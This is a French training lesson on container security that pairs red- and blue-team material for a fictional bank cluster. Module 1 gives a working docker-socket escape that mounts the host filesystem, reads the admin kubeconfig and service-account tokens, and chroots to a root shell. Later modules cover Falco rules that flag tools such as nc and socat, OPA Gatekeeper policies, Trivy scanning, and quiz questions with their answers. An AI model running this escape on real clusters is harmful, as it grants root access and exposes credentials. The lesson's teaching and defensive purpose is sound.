# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 231 (6h) : Sécurité des Conteneurs (Docker Escape, Privileged Container Abuse, Falco Runtime Security, OPA Gatekeeper & Image Scanning Trivy)

> [!NOTE]
> **Objectif du jour :** Maîtriser la sécurité des environnements de conteneurs : exploitation des mauvaises configurations Docker (**Privileged Container Escape**, montage du socket Docker `/var/run/docker.sock`, abus des capabilities Linux), détection des comportements anormaux en runtime avec **Falco**, enforcement de politiques de sécurité Kubernetes avec **OPA Gatekeeper**, et analyse des vulnérabilités d'images de conteneurs avec **Trivy**.
>
> **Compétences visées :** `SEC-04` (A) — Container Security Docker Escape & Privileged Abuse | `SEC-05` (A) — Falco Runtime Detection, OPA Gatekeeper Policies & Trivy Image Scanning

---

## 1) Module — Docker Security & Techniques d'Évasion de Conteneur (2h)

### 📖 Narration/Intuition

La BCC déploie ses services MNBC dans des conteneurs Docker orchestrés par Kubernetes. Une mauvaise configuration de ces conteneurs peut permettre à un attaquant ayant compromis un pod d'**évasion de conteneur (Container Escape)** — c'est-à-dire de sortir de l'isolation du conteneur pour atteindre le nœud Kubernetes sous-jacent (l'hôte Linux), puis de pivoter vers d'autres pods ou vers l'API Kubernetes.

### 🔍 Anatomie Technique

**Vecteurs d'Évasion de Conteneurs Docker :**

```
┌───────────────────────────────────────────────────────────────────────┐
│              SURFACE D'ATTAQUE — CONTENEURS DOCKER/KUBERNETES         │
├──────────────────────────────────────┬────────────────────────────────┤
│ VECTEUR D'ÉVASION                    │ CONDITION REQUISE              │
├──────────────────────────────────────┼────────────────────────────────┤
│ Privileged Container                 │ --privileged ou securityContext│
│   (Accès complet aux devices hôte)   │   privileged: true             │
├──────────────────────────────────────┼────────────────────────────────┤
│ Docker Socket Mount                  │ -v /var/run/docker.sock:/var/  │
│   (Contrôle total du daemon Docker)  │    run/docker.sock             │
├──────────────────────────────────────┼────────────────────────────────┤
│ HostPID / HostNetwork                │ hostPID: true / hostNetwork:   │
│   (Accès aux processus/réseau hôte)  │   true dans le pod spec        │
├──────────────────────────────────────┼────────────────────────────────┤
│ Capabilities Dangereuses             │ CAP_SYS_ADMIN, CAP_NET_ADMIN,  │
│   (ex: CAP_SYS_PTRACE pour hijack)   │   CAP_SYS_PTRACE              │
├──────────────────────────────────────┼────────────────────────────────┤
│ CVE Kernel (ex: CVE-2022-0492)       │ Conteneur non-privileged avec  │
│   (cgroup v1 escape)                 │   cgroups v1 non patchés       │
└──────────────────────────────────────┴────────────────────────────────┘
```

**Exploitation : Docker Socket Mount → Container Escape (`docker_escape.sh`) :**

```bash
# SCÉNARIO RED TEAM : Le pod bcc-debug-tools a été déployé avec le socket Docker monté
# kubectl exec -it bcc-debug-tools -- /bin/bash

# VÉRIFICATION : Le socket Docker est-il accessible depuis le conteneur ?
ls -la /var/run/docker.sock
# Output : srw-rw---- 1 root docker 0 Aug 6 02:31 /var/run/docker.sock

# 🚨 EXPLOITATION : Utiliser le socket Docker pour créer un conteneur privilégié
# qui monte le système de fichiers de l'HÔTE Kubernetes
docker -H unix:///var/run/docker.sock run -it \
    --rm \
    --privileged \
    -v /:/host \        # Monter le FS racine de l'HÔTE dans /host
    ubuntu:22.04 \
    /bin/bash

# Maintenant nous sommes dans un nouveau conteneur avec accès total à l'hôte !
# Lire les secrets Kubernetes depuis le nœud hôte
cat /host/etc/kubernetes/admin.conf  # ← Kubeconfig admin du cluster !
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token  # ← Tokens SA

# Chroot vers le FS hôte (shell complet sur le nœud Kubernetes !)
chroot /host /bin/bash
hostname  # Output : k8s-node-bcc-prod-01 — Nous sommes sur le NŒUD hôte !

echo "🚨 CONTAINER ESCAPE RÉUSSI — Accès complet au nœud Kubernetes BCC !"
```

---

## 2) Module — Falco Runtime Security & Détection d'Anomalies (2h)

### 📖 Narration/Intuition

**Falco** (CNCF project) est un moteur de détection de menaces à l'exécution (Runtime Threat Detection) pour les conteneurs Linux, basé sur les **syscalls** (appels système Linux) interceptés via **eBPF**. Il analyse en temps réel le comportement de chaque conteneur et déclenche des alertes lorsqu'un comportement anormal est détecté.

### 🛠️ Atelier Pratique

**Règles Falco pour la Détection d'Évasion de Conteneur BCC (`falco_rules_bcc.yaml`) :**

```yaml
# /etc/falco/rules.d/bcc_custom_rules.yaml

# RÈGLE 1 : Détection d'accès au socket Docker depuis un conteneur
- rule: Docker Socket Access from Container
  desc: Détecte tout accès au socket Docker depuis un conteneur (risque d'évasion)
  condition: >
    spawned_process and
    container and
    fd.name = "/var/run/docker.sock"
  output: >
    🚨 ALERTE CRITIQUE — Docker socket accédé depuis conteneur
    (container=%container.name pod=%k8s.pod.name
     process=%proc.name user=%user.name
     cmd=%proc.cmdline)
  priority: CRITICAL
  tags: [container_escape, T1611]

# RÈGLE 2 : Détection de shell interactif dans un conteneur de production
- rule: Interactive Shell Spawned in Production Container
  desc: Détecte l'ouverture d'un shell interactif dans les pods de production BCC
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, fish) and
    proc.tty != 0 and
    k8s.ns.name in (mnbc-production, scada-ot)
  output: >
    ⚠️ ALERTE HAUTE — Shell interactif détecté en production
    (container=%container.name namespace=%k8s.ns.name
     shell=%proc.name user=%user.name parent=%proc.pname)
  priority: WARNING
  tags: [shell_in_container, T1059]

# RÈGLE 3 : Détection d'écriture dans /etc (Persistance)
- rule: Write to /etc in Container
  desc: Détecte toute écriture dans /etc d'un conteneur (modification de configuration système)
  condition: >
    open_write and
    container and
    fd.name startswith /etc and
    not proc.name in (apt, dpkg, rpm)
  output: >
    ⚠️ ALERTE — Écriture dans /etc d'un conteneur BCC
    (file=%fd.name process=%proc.name container=%container.name)
  priority: WARNING
  tags: [persistence, T1543]

# RÈGLE 4 : Détection de scan réseau depuis un pod BCC
- rule: Network Scanning Tool Detected in Container
  desc: Détecte l'exécution d'outils de scan réseau (nmap, masscan) dans un pod
  condition: >
    spawned_process and
    container and
    proc.name in (nmap, masscan, nc, netcat, socat, ncat)
  output: >
    🚨 ALERTE CRITIQUE — Outil de scan réseau exécuté dans pod BCC
    (tool=%proc.name container=%container.name namespace=%k8s.ns.name
     args=%proc.args)
  priority: CRITICAL
  tags: [discovery, T1046]
```

---

## 3) Module — OPA Gatekeeper & Trivy Image Scanning (2h)

### 🛠️ Atelier Pratique

**Politiques OPA Gatekeeper — Prévention des Conteneurs Privilégiés BCC (`opa_policies.yaml`) :**

```yaml
# Constraint Template : Interdire les conteneurs privilégiés
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8snocprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sNoCPrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8snocprivilegedcontainer

        violation[{"msg": msg}] {
          c := input.review.object.spec.containers[_]
          c.securityContext.privileged == true
          msg := sprintf("🚨 REJETÉ — Conteneur privilégié interdit dans namespace %v: container=%v",
                          [input.review.object.metadata.namespace, c.name])
        }

        violation[{"msg": msg}] {
          c := input.review.object.spec.initContainers[_]
          c.securityContext.privileged == true
          msg := sprintf("🚨 REJETÉ — InitContainer privilégié interdit: %v", [c.name])
        }
---
# Constraint : Appliquer la politique sur tous les namespaces BCC de production
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sNoCPrivilegedContainer
metadata:
  name: no-privileged-containers-bcc
spec:
  match:
    namespaces: ["mnbc-production", "scada-ot", "blockchain-mnbc"]
```

**Scan de Vulnérabilités d'Images Docker avec Trivy (`trivy_scan.sh`) :**

```bash
# Installation Trivy (Aqua Security — Container Vulnerability Scanner)
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# 1. Scanner l'image de la Lambda Settlement BCC avant déploiement
trivy image bcc-registry.ecr.af-south-1.amazonaws.com/bcc-settlement:latest

# OUTPUT (Vulnérabilités détectées) :
# bcc-settlement:latest (ubuntu 22.04)
# ═══════════════════════════════════════════════════════════════
# Total: 47 (UNKNOWN: 0, LOW: 23, MEDIUM: 18, HIGH: 4, CRITICAL: 2)
#
# CRITICAL:
# ┌────────────────┬──────────────────┬──────────┬───────────────────────────────┐
# │ Library        │ Vulnerability    │ Severity │ Installed → Fixed Version     │
# ├────────────────┼──────────────────┼──────────┼───────────────────────────────┤
# │ libssl3        │ CVE-2024-0727    │ CRITICAL │ 3.0.2-0ubuntu1.13 → 3.0.2-14 │
# │ python3-pip    │ CVE-2023-5752    │ CRITICAL │ 22.0.2+dfsg → 23.3            │
# └────────────────┴──────────────────┴──────────┴───────────────────────────────┘

# 2. Scanner avec génération d'un SBOM (Software Bill of Materials)
trivy image --format cyclonedx --output bcc-settlement-sbom.json \
    bcc-registry.ecr.af-south-1.amazonaws.com/bcc-settlement:latest
echo "✅ SBOM CycloneDX généré : bcc-settlement-sbom.json"

# 3. Intégration dans la CI/CD — Bloquer le déploiement si CRITICAL trouvé
trivy image --exit-code 1 --severity CRITICAL \
    bcc-registry.ecr.af-south-1.amazonaws.com/bcc-settlement:latest
# Exit code 1 → GitHub Actions marque le pipeline comme FAILED → Déploiement bloqué !
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **OPA** | Open Policy Agent — Moteur de politiques déclaratives open-source pour Kubernetes |
| **Falco** | Outil CNCF de détection de menaces à l'exécution pour conteneurs via syscalls eBPF |
| **Trivy** | Scanner open-source Aqua Security de vulnérabilités d'images Docker/OCI et SBOM |
| **CNCF** | Cloud Native Computing Foundation — Organisation hébergeant les projets cloud-native open-source |
| **Syscall** | System Call — Appel système Linux permettant aux processus d'interagir avec le kernel |
| **CycloneDX** | Format standard OWASP de SBOM (Software Bill of Materials) pour l'inventaire des composants |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Expliquer pourquoi monter le socket Docker (`/var/run/docker.sock`) dans un conteneur est considéré comme une **évasion de conteneur immédiate** et équivalent à accorder les droits root sur le nœud hôte.

**Corrigé :** Le **daemon Docker** (`dockerd`) s'exécute avec les droits **root** sur le nœud hôte et écoute les commandes via son socket Unix `/var/run/docker.sock`. Lorsque ce socket est monté dans un conteneur (ex: `-v /var/run/docker.sock:/var/run/docker.sock`), tout processus à l'intérieur du conteneur peut communiquer directement avec le daemon Docker de l'hôte via l'API Docker. Cela permet à un attaquant d'exécuter n'importe quelle commande Docker, notamment de **créer un nouveau conteneur privilégié** qui monte le système de fichiers racine de l'hôte (`-v /:/host`) et d'y exécuter un `chroot /host` — obtenant ainsi un shell complet sur le nœud Kubernetes hôte avec les droits root. C'est une **évasion de conteneur immédiate** car aucune CVE ou exploit kernel n'est nécessaire : c'est une fonctionnalité légitime de Docker utilisée de façon malveillante. **Règle** : Ne jamais monter `/var/run/docker.sock` dans un conteneur de production. Si indispensable (ex: un agent CI/CD), utiliser un proxy socket restreint (ex: Socket Proxy Tecnativa avec liste blanche d'opérations autorisées).

**Exercice 2 :** Dans une pipeline CI/CD sécurisée (DevSecOps), à quel moment **Trivy** doit-il être exécuté et quelle configuration permet de **bloquer automatiquement** le déploiement d'une image contenant des vulnérabilités CRITIQUE ?

**Corrigé :** Trivy doit être intégré à **trois étapes** de la pipeline CI/CD DevSecOps : (1) **Lors du build de l'image** (étape `docker build`) : Trivy analyse l'image fraîchement construite avant qu'elle ne soit poussée dans le registre. (2) **Lors du push dans le registre** : Trivy (ou un scanner équivalent comme AWS ECR scanning) analyse l'image lors de son push. (3) **Régulièrement sur le registre** (scan périodique) : Des images déjà déployées peuvent devenir vulnérables suite à la publication de nouvelles CVEs — un scan hebdomadaire automatique est indispensable. **Blocage automatique** : La commande `trivy image --exit-code 1 --severity CRITICAL <image>` retourne un **code de sortie 1** si une vulnérabilité CRITICAL est trouvée, et 0 sinon. Dans une pipeline GitHub Actions, si l'étape Trivy retourne exit code 1, le job suivant (déploiement sur Kubernetes) ne s'exécute pas (`needs:` sur le job de scan + `if: success()`), **bloquant automatiquement** le déploiement en production.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle configuration Kubernetes dans le `securityContext` d'un pod rend un conteneur capable d'accéder à tous les devices du nœud hôte et constitue la principale vecteur d'évasion de conteneur à bloquer via OPA Gatekeeper ?
- A) `privileged: true` dans le `securityContext` du conteneur
- B) `readOnlyRootFilesystem: true`
- C) `runAsNonRoot: true`
- D) `allowPrivilegeEscalation: false`

**Réponse : A**

**Q2 :** Quel projet CNCF open-source analyse les **syscalls Linux en temps réel** via eBPF pour détecter les comportements anormaux dans les conteneurs Kubernetes (ex: shell interactif, accès au socket Docker, scan réseau) ?
- A) Falco
- B) OPA Gatekeeper
- C) Trivy
- D) Cilium

**Réponse : A**

**Q3 :** Quel outil open-source d'Aqua Security scanne les images Docker pour détecter les vulnérabilités CVE dans les paquets OS et bibliothèques, et génère des **SBOM** au format CycloneDX ou SPDX ?
- A) Trivy
- B) Falco
- C) Caldera
- D) PACU

**Réponse : A**

**Q4 :** Comment le montage du socket Docker (`-v /var/run/docker.sock:/var/run/docker.sock`) dans un conteneur permet-il une évasion immédiate vers le nœud hôte Kubernetes ?
- A) Il donne accès à l'API Docker root de l'hôte, permettant de créer un nouveau conteneur privilégié qui monte le FS racine de l'hôte (`-v /:/host`) et d'y exécuter un shell root via `chroot`
- B) Il expose les logs du daemon Docker uniquement
- C) Il permet uniquement de lister les images Docker présentes sur le nœud
- D) Il chiffre les communications entre conteneurs

**Réponse : A**

**Q5 :** Quel moteur de politiques déclaratives open-source (CNCF), utilisant le langage **Rego**, permet d'enforcer des règles de sécurité sur les objets Kubernetes (ex: interdire les conteneurs privilégiés, forcer `readOnlyRootFilesystem`) en les rejetant à l'admission ?
- A) OPA Gatekeeper (Open Policy Agent)
- B) Falco
- C) Cilium
- D) Kyverno uniquement

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
